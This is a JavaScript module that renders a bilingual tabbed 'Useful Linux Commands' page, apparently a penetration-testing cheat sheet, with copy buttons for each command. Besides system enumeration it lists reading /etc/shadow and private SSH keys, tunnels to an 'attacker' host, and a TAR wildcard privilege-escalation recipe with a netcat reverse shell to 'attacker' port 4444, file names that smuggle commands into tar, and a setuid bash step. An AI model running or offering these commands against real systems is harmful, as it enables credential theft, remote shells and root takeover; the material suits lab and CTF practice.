const categories = {
  'SUID Enum': [
    { cmd: 'find / -perm -4000 -type f 2>/dev/null' },
    { cmd: 'find / -perm -u=s -type f 2>/dev/null' },
    { cmd: 'find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null' },
    { cmd: 'find / -perm -2000 -type f 2>/dev/null' },
    { cmd: 'find / -perm -g=s -type f 2>/dev/null' },
    { cmd: 'for i in $(ls /usr/bin/*); do if [ -u $i ]; then echo $i; fi; done' },
  ],
  'System Version': [
    { cmd: 'cat /etc/os-release' },
    { cmd: 'cat /etc/issue' },
    { cmd: 'lsb_release -a' },
    { cmd: 'hostnamectl' },
    { cmd: 'uname -a' },
    { cmd: 'cat /proc/version' },
  ],
  'Kernel Version': [
    { cmd: 'uname -r' },
    { cmd: 'uname -a' },
    { cmd: 'cat /proc/version' },
    { cmd: 'dmesg | grep "Linux version"' },
    { cmd: 'ls /boot/vmlinuz*' },
  ],
  'Environment Variables': [
    { cmd: 'env' },
    { cmd: 'printenv' },
    { cmd: 'cat ~/.bashrc' },
    { cmd: 'cat ~/.profile' },
    { cmd: 'cat /etc/environment' },
    { cmd: 'cat /etc/profile' },
    { cmd: 'echo $PATH' },
    { cmd: 'echo $HOME' },
    { cmd: 'echo $SHELL' },
  ],
  'Service Settings': [
    { cmd: 'systemctl list-units --type=service --all' },
    { cmd: 'systemctl list-unit-files' },
    { cmd: 'service --status-all' },
    { cmd: 'cat /etc/services' },
    { cmd: 'ps aux' },
    { cmd: 'ps -ef' },
    { cmd: 'top -bn1' },
  ],
  'Cron Jobs': [
    { cmd: 'crontab -l' },
    { cmd: 'cat /etc/crontab' },
    { cmd: 'ls -la /etc/cron.d/' },
    { cmd: 'ls -la /etc/cron.daily/' },
    { cmd: 'ls -la /etc/cron.hourly/' },
    { cmd: 'ls -la /etc/cron.weekly/' },
    { cmd: 'ls -la /etc/cron.monthly/' },
    { cmd: 'cat /etc/cron.d/*' },
    { cmd: 'for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done' },
  ],
  'Network / Users': [
    { cmd: 'ifconfig' },
    { cmd: 'ip a' },
    { cmd: 'ip route' },
    { cmd: 'netstat -tulpn' },
    { cmd: 'ss -tulpn' },
    { cmd: 'cat /etc/passwd' },
    { cmd: 'cat /etc/shadow' },
    { cmd: 'cat /etc/group' },
    { cmd: 'whoami' },
    { cmd: 'id' },
    { cmd: 'w' },
    { cmd: 'last' },
    { cmd: 'lastlog' },
    { cmd: 'users' },
    { cmd: 'cat ~/.ssh/authorized_keys' },
    { cmd: 'cat ~/.ssh/id_rsa' },
  ],
  'Port Forwarding': [
    { cmd: 'ssh -L 8080:localhost:80 user@target' },
    { cmd: 'ssh -R 8080:localhost:80 user@attacker' },
    { cmd: 'ssh -D 1080 user@target' },
    { cmd: 'socat TCP-LISTEN:8080,fork TCP:target:80' },
    { cmd: 'nc -lvp 8080 -c "nc target 80"' },
    { cmd: 'chisel server -p 8080 --reverse' },
    { cmd: 'chisel client attacker:8080 R:8000:localhost:80' },
    { cmd: 'ssh -L 0.0.0.0:8080:localhost:80 user@target -g' },
  ],
  'TAR Wildcard PrivEsc': [
    { cmd: 'echo "mkfifo /tmp/exploit; nc attacker 4444 0</tmp/exploit | /bin/sh -i 2>&1 >/tmp/exploit" > shell.sh' },
    { cmd: 'echo "" > "--checkpoint-action=exec=sh shell.sh"' },
    { cmd: 'echo "" > --checkpoint=1' },
    { cmd: 'tar cf archive.tar *' },
    { cmd: 'echo "chmod +s /bin/bash" > run.sh' },
    { cmd: 'echo "" > "--checkpoint-action=exec=bash run.sh"' },
  ],
};

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

export default function render(lang) {
  const isFa = lang === 'fa';
  const catNames = Object.keys(categories);
  return `
<div class="section-title">${isFa ? 'دستورات مفید لینوکس' : 'Useful Linux Commands'}</div>
<div class="tabs" id="linux-tabs">
  ${catNames.map((c, i) => `<button class="tab${i === 0 ? ' active' : ''}" data-tab="linux-${i}">${c}</button>`).join('')}
</div>
${catNames.map((c, i) => `
<div class="tab-pane${i === 0 ? ' active' : ''}" id="linux-${i}">
  ${categories[c].map(p => `
  <div class="panel" style="padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px">
    <pre style="flex:1;margin:0;overflow:auto;background:var(--bg-2);padding:10px;border-radius:var(--radius-sm)"><code>${escapeHtml(p.cmd)}</code></pre>
    <button class="secondary-btn" data-copy="${escapeHtml(p.cmd)}" style="flex-shrink:0">${isFa ? 'کپی' : 'Copy'}</button>
  </div>`).join('')}
</div>`).join('')}`;
}

export function init(lang) {
  const container = document.getElementById('content');
  container.addEventListener('click', (e) => {
    const btn = e.target.closest('.secondary-btn');
    if (btn && btn.hasAttribute('data-copy')) {
      navigator.clipboard.writeText(btn.getAttribute('data-copy'));
    }
    const tab = e.target.closest('.tab');
    if (tab && tab.closest('#linux-tabs')) {
      container.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      container.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      const pane = document.getElementById(tab.getAttribute('data-tab'));
      if (pane) pane.classList.add('active');
    }
  });
}
